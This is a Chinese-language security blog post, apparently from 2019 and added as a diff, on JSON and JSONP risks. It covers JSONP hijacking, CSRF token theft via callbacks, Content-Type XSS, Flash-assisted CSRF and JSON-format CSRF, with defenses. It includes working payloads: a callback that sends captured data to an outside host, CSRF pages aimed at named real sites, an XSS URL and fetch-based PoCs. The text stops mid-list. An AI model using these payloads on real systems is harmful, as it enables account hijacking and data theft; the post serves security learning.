@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[TOC] json与jsonp的学习与分析json和jsonp的区别避免在后续的工作中把json和jsonp搞混，这里说明下其区别 json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求 json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。12345678910&amp;lt;script&amp;gt;fun">
+<meta name="keywords" content="止于唇齿，掩于岁月">
+<meta property="og:type" content="article">
+<meta property="og:title" content="json与jsonp的学习与分析">
+<meta property="og:url" content="http://yoursite.com/2019/07/21/安全策略/json/index.html">
+<meta property="og:site_name" content="吾善养浩然气">
+<meta property="og:description" content="[TOC] json与jsonp的学习与分析json和jsonp的区别避免在后续的工作中把json和jsonp搞混，这里说明下其区别 json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求 json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。12345678910&amp;lt;script&amp;gt;fun">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-21T04:44:08.852Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="json与jsonp的学习与分析">
+<meta name="twitter:description" content="[TOC] json与jsonp的学习与分析json和jsonp的区别避免在后续的工作中把json和jsonp搞混，这里说明下其区别 json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求 json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。12345678910&amp;lt;script&amp;gt;fun">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/21/安全策略/json/"/>
+
+
+
+
+
+  <title>json与jsonp的学习与分析 | 吾善养浩然气</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">吾善养浩然气</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/21/安全策略/json/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="blackj liuyun">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="吾善养浩然气">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">json与jsonp的学习与分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-21T12:44:08+08:00">
+                2019-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">Web渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web渗透/安全策略/" itemprop="url" rel="index">
+                    <span itemprop="name">安全策略</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>[TOC]</p>
+<h1 id="json与jsonp的学习与分析"><a href="#json与jsonp的学习与分析" class="headerlink" title="json与jsonp的学习与分析"></a>json与jsonp的学习与分析</h1><h2 id="json和jsonp的区别"><a href="#json和jsonp的区别" class="headerlink" title="json和jsonp的区别"></a>json和jsonp的区别</h2><p>避免在后续的工作中把json和jsonp搞混，这里说明下其区别</p>
+<p>json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求</p>
+<p>json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test(data)&#123;</span><br><span class="line">    //alert(v.name);</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &quot;http://xx.xx.xx.xx/&quot; + JSON.stringify(data);</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://xx.xx.xx.xx/1.php?callback=test&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="jsonp-简介"><a href="#jsonp-简介" class="headerlink" title="jsonp 简介"></a>jsonp 简介</h2><p>json padding 将json数据填充进回调函数；在客户端创建一个回调函数并将回调函数名传给服务端，服务端根据定义的回调函数名的方法，将获取的json数据传入方法，完成回调。</p>
+<h2 id="jsonp-风险"><a href="#jsonp-风险" class="headerlink" title="jsonp 风险"></a>jsonp 风险</h2><h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>只使用csrf-token进行csrf校验</li>
+</ul>
+<p>获取csrf token这类跨域问题，CORS、PostMessage以及jsonp，这里我们先讨论jsonp的情况，在遇到这类时，可以先尝试检查是否存在泄漏token的jsonp。</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ul>
+<li>测试方法，在get url中添加jsonp常用回调函数（可以根据具体的情况判断），常用函数名的变量名如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback、jsonpcallback、func</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>通过jsonp获取到后端身份校验token，构造CSRF页面 嵌入获取到的token值，进行后段绕过校验CSRF攻击。<br>利用示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&quot; method=&quot;POST&quot; id=&quot;csrfsend&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;bid&quot; value=&quot;9947&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;tid&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;这是测试结果&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;这是测试标题&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;_csrf_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;anonymous&quot; value=&quot;1&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function hehehe(obj)&#123;</span><br><span class="line">    console.log(obj);</span><br><span class="line">    var csrf_token = obj[&quot;result&quot;][&quot;data&quot;][&quot;_csrf_token&quot;];</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = csrf_token;</span><br><span class="line">    document.getElementById(&quot;csrfsend&quot;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><ul>
+<li>referer限制（注意referer过滤是否正则可绕过如<a href="http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）" target="_blank" rel="noopener">http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）</a></li>
+<li>随机token</li>
+</ul>
+<h3 id="callback可自定义导致的安全问题-典型案例"><a href="#callback可自定义导致的安全问题-典型案例" class="headerlink" title="callback可自定义导致的安全问题 典型案例"></a>callback可自定义导致的安全问题 典型案例</h3><h4 id="Content-Type与XSS漏洞"><a href="#Content-Type与XSS漏洞" class="headerlink" title="Content-Type与XSS漏洞"></a>Content-Type与XSS漏洞</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>输出json时，没有严格定义Content-Type（Content-Type: application/json）</li>
+<li>callback 输出点没有进行过滤处理</li>
+</ul>
+<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><h5 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h5><ul>
+<li>严格定义Content-Type: application/json</li>
+</ul>
+<ol>
+<li>Content-Type校验不严漏洞</li>
+</ol>
+<p>在python Bottle中出现过这个问题，对应的cve编号CVE-2014-3137，在该漏洞中Bottle框架会接受诸如“text / plain; application / json”作为json内容 application/json<br>类型，攻击者可能会使用它来绕过安全机制，例如，Chrome不允许将内容类型设置为“application / json”的跨源xmlhttprequests，但在bottel中可以将其设置为“text / plain; application / json”绕过。</p>
+<p>绕过形式 Content-Type防御解析HTML的事件，例如在IE6、7等版本请求的URL文件后加一个/x.html就可以解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/getUsers.php/x.html?callback=＜script＞alert(/xss/)＜/script＞</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>过滤callback以及JSON数据输出<br>注意 旧版ie中的utf7-BOM导致的问题</li>
+</ul>
+<h3 id="MHTML与JSONP"><a href="#MHTML与JSONP" class="headerlink" title="MHTML与JSONP"></a>MHTML与JSONP</h3><p>MHTML（MIME HTML协议）协议解析跨域漏洞，这个有点老，先不管</p>
+<h3 id="FLASH与JSONP"><a href="#FLASH与JSONP" class="headerlink" title="FLASH与JSONP"></a>FLASH与JSONP</h3><p>这个也是早年的漏洞问题了，这里要稍微注意下content-type与jsonp的关系，执行jsonp的状态下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type = &apos;application/json;charset=UTF-8&apos; </span><br><span class="line">Content-Type = &apos;text/json;charset=UTF-8&apos; </span><br><span class="line">Content-Type = &apos;text/javascript;charset=UTF-8&apos; </span><br><span class="line">Content-Type =&apos;application/javascript;charset=UTF-8&apos;</span><br></pre></td></tr></table></figure></p>
+<p>严格来说json格式也属于js对象的子集，严格的JavaScript对象表示法来表示结构化的数据，所以使用content-type为javascript时，服务端也认可客户端提交的json格式数据。</p>
+<h5 id="FLASH的调用及域"><a href="#FLASH的调用及域" class="headerlink" title="FLASH的调用及域"></a>FLASH的调用及域</h5><ul>
+<li>html调用flash，flash可以改后缀名(swf改成gif等)。</li>
+<li>flash可以单独访问，但是其效果类似与html调用同域的flash，但只这个后缀必须是swf。</li>
+<li>flash发动请求时，是根据flash的域来判断的，而不是html来判断：</li>
+</ul>
+<ol>
+<li>flash请求同域资源时，直接忽视crossdomain.xml。</li>
+<li>flash（跨域传输数据）请求外域资源时，受外域下crossdomain.xml里的策略限制。</li>
+</ol>
+<p>在CSRF的防御策略上，一般是通过referer以及token校验，但在借用flash上传的时候，可以绕过CSRF的referer和token限制。在只有referer校验的CSRF，就可以直接用 上传flash利用，在有token校验的时候，就要劫持token，在用到jsonp，就可以用jsonp劫持token，进一步利用</p>
+<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>利用思路如下：</p>
+<ol>
+<li>将flash文件上传到存在上传处的目标网站中</li>
+<li>用户触发该flash中的csrf代码，由于flash请求同源资源时，直接忽视crossdomain.xml,flash发送的请求的Referer是flash的因此referer校验无效，在存在jsonp劫持的条件下，可以获取用户token，这个时候token校验值也无效了。通过flash上传+jsonp劫持绕过referer校验和token校验达到CSRF。</li>
+</ol>
+<h5 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h5><p>在利用这个jsonp之前，先来了解一下swf-json-csrf</p>
+<h6 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h6><ul>
+<li>支持旧版本flash浏览器<br>GET以及POST请求可用：</li>
+</ul>
+<p>chrome 61.0及以前</p>
+<p>firefox 52.0.1及以前</p>
+<p>Opera 47.0及以前</p>
+<p>Safari 11.0及以前</p>
+<ul>
+<li>开启referer验证+token验证</li>
+</ul>
+<h3 id="利用JSONP进行水坑攻击"><a href="#利用JSONP进行水坑攻击" class="headerlink" title="利用JSONP进行水坑攻击"></a>利用JSONP进行水坑攻击</h3><p>这个是乌云里面一篇较早的文章了，水坑攻击者在有漏洞的网站上部署上可触发获取别的网站有用信息的js，如：攻击者在A网站上插入了可执行的js，建立水坑；js利用callback获取第三方网站B上的对应用户信息；将获取的信息解析发送给攻击者自己的接收平台。</p>
+<h2 id="JSON风险"><a href="#JSON风险" class="headerlink" title="JSON风险"></a>JSON风险</h2><p>目标是 利用FLASH利用JSON跨站点请求伪造</p>
+<h3 id="JSON格式的CSRF"><a href="#JSON格式的CSRF" class="headerlink" title="JSON格式的CSRF"></a>JSON格式的CSRF</h3><p>当数据内容提交为json格式的报文时，CSRF和常规的CSRF就不一样了，即便这个CSRF没有校验referer和token，这个时候post的数据用form形式提交，将json内容放在name属性中，这个时候会有一个value值，当这个value值为空的时候，数值会有一个”=”，正常情况下服务端json解析器在校验的时候可能会拒绝这个请求（不符合格式）。</p>
+<p>随意在burp里面翻了个包来测试 效果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Referer: https://blog.csdn.net/</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Content-Length: 551</span><br><span class="line">Origin: https://blog.csdn.net</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>借用burp生成的csrf的POC，将json内容置为name，value置为空<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>请求内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Referer: http://burp/</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 554</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;=</span><br></pre></td></tr></table></figure></p>
+<p>返回结果：json解析器并不解析，并且Content-Type为也由原本的application/json转换为text/plain类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.12.2</span><br><span class="line">Date: Fri, 22 Feb 2019 07:52:08 GMT</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Length: 77</span><br><span class="line">Connection: close</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line"></span><br><span class="line">The request content was malformed:</span><br><span class="line">unknown token =</span><br><span class="line">Near: e&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;=</span><br></pre></td></tr></table></figure>
+<h4 id="服务器查找json格式的数据但不验证Content-type"><a href="#服务器查找json格式的数据但不验证Content-type" class="headerlink" title="服务器查找json格式的数据但不验证Content-type"></a>服务器查找json格式的数据但不验证Content-type</h4><p>对于服务器查找json格式的数据但不验证Content-type的情况，可以尝试以下方法(使用Content-type：text / plain来实现)：</p>
+<ul>
+<li><p>方法一 fetch api的调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;JSON CSRF POC&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&apos;http://vul-app.com&apos;, &#123;method: &apos;POST&apos;, credentials: &apos;include&apos;, headers: &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;, body: &apos;&#123;&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker.com&quot;&#125;&apos;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;form action=&quot;#&quot;&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法二 hackerone 上的方法</p>
